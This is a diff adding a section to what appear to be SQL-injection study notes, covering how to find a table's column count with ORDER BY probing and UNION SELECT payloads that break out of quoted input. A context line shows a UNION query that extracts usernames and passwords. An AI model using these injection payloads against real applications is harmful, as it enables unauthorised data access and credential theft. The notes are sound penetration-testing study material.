@@ -224,4 +224,37 @@ SELECT * FROM products where product_id = '1' UNION SELECT username, password, 3
 ```
 :warning: Your junk data must fit the same datatype as the column you're trying to fill. The easiest way around this, is to just use `NULL`, as `NULL` fits all data types.
 
-continue on section 12
+## Detecting the Number of Columns
+### `ORDER BY`
+We can use the `ORDER BY` function until we generate an error. 
+For Example on a table with 4 columns:
+```sql
+order by 3--
+# Get's us results
+```
+and then:
+```sql
+order by 4-- 
+# Get's us results
+```
+
+and then:
+```sql
+order by 5--
+# Get's us an error
+```
+Now we know the table has 4 columns
+
+### `UNION`
+When using `ORDER BY`, we get results until we hit an error, with `UNION` we get an error until we get results
+
+Example of a table with 4 columns:
+```sql
+cn' UNION select 1,2,3--
+# This will generate an error
+```
+```sql
+cn' UNION select 1,2,3,4-- 
+# This gets us results, so we know we have 4 columns
+```
+
